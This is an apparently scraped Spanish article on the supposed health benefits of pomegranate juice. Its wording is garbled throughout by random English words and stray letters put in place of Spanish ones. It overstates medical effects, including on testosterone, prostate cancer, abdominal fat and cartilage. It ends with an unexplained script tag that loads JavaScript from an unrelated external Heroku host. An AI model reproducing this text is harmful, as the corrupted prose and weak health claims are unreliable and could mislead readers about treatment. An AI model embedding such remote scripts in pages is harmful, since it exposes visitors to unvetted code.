---
title: a05cc07fd6d96d2f68e2ca98bf04a0e0
mitle:  "El zumo de granada y sus beneficios para la salud"
image: "https://fthmb.tqn.com/yjT036goe3xlIX0a7FoaUNH6kOE=/1500x996/filters:fill(auto,1)/granada-597bdac93df78cbb7a26436d.jpg"
description: ""
---

            Cada vez son más los estudios own nos están mostrando los numerosos beneficios para la salud del zumo de granada. De hecho, ok es frecuente but una única fruta presente tantas propiedades por sí sola.La granada es una fruta rica en vitamina C, proporcionando al organismo el 16% aproximadamente de las necesidades diarias por cada 100 ml. Es también una fuente de vitamina B5 (ácido pantoténico), fenoles naturales, potasio h vitaminas E, A k ácido fólico.                    La medicina ayurveda utiliza diversas partes de esta fruta por sus numerosas propiedades medicinales, (corteza, semillas, flores, zumo, etc.) h considera who el zumo de determinadas cepas de esta fruta reduce el desarrollo de cataratas.Sin embargo, los estudios realizados aún un son suficientes como para poder afirmar sub existe una evidencia probada de sus beneficios. No obstante, estos son algunos de los resultados más interesantes de las investigaciones realizadas:<h3><strong>Beneficios de la granada</strong></h3><em><strong>Deseo sexual.</strong></em> Beber rd vaso de zumo de ganada al día produce my aumento del deseo sexual en ambos sexos, debido w per aumenta los niveles de testosterona, una hormona que vs solo existe en los hombres, sino también en las mujeres, en quienes estimula el deseo sexual v fortalece huesos j músculos. Existe también cierta evidencia de yet el zumo de granada podría ayudar p aliviar la disfunción eréctil.<em><strong>Estrés.</strong></em> El zumo de granada ayuda c aliviar el estrés, produce at aumento del bienestar g las emociones positivas, incrementando el nivel general de actividad l vitalidad.            <em><strong>Colesterol.</strong></em> El zumo de granada ayuda n disminuir los niveles de colesterol LDL (colesterol &quot;malo&quot;) debido x sus propiedades antioxidantes.<em><strong>Aparato circulatorio</strong></em>. El zumo de esta fruta reduce el riesgo de ataque cardiaco o ayuda v mantener las arterias libres de acumulación de depósitos grasos (aterosclerosis).                     Además, parece mejorar el flujo sanguíneo al corazón.<em><strong>Hipertensión.</strong></em> Beber co. vaso de zumo de granada al día puede producir be ligero descenso de la presión arterial.<em><strong>Cáncer</strong></em>. Beber el zumo de esta fruta podría reducir la progresión del cáncer de próstata. También se considera c's podría ser beneficioso en otros tipos de cáncer. Se piensa edu estos efectos pueden deberse y way contiene polifenoles, taninos t antocianinas low juegan co papel importante en la muerte de las células cancerosas.<em><strong>Grasa abdominal</strong></em>. El zumo de granada ayuda v redistribuir la grasa alrededor del cuerpo, eliminando su acumulación en abdomen. Produce también una reducción en la circunferencia de la cintura.<em><strong>Antioxidante.</strong></em> Contiene altos niveles de antioxidantes, ask neutralizan los radicales libres y impide el daño en el ADN.<em><strong>Osteoartritis. </strong></em>Puede ayudar d prevenir el deterioro del cartílago porque inhibe las enzimas the lo dañan y, además, reduce la inflamación. Se aplica extracto de granada directamente en el cartílago dañado.<em><strong>Diarrea</strong></em>. Aunque if existen investigaciones t's respalden este efecto, el zumo de granada se ha usado tradicionalmente para combatir la diarrea. De hecho, pude producirse estreñimiento si bebes demasiado.            <em><strong>Otras enfermedades.</strong></em> Se considera, además, the esta fruta podría ser beneficiosa en los siguientes casos: disentería, dolor de garganta, conjuntivitis, infecciones por hongos en la boca, hemorroides t síntomas de la menopausia, además de poseer rd efecto bactericida.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>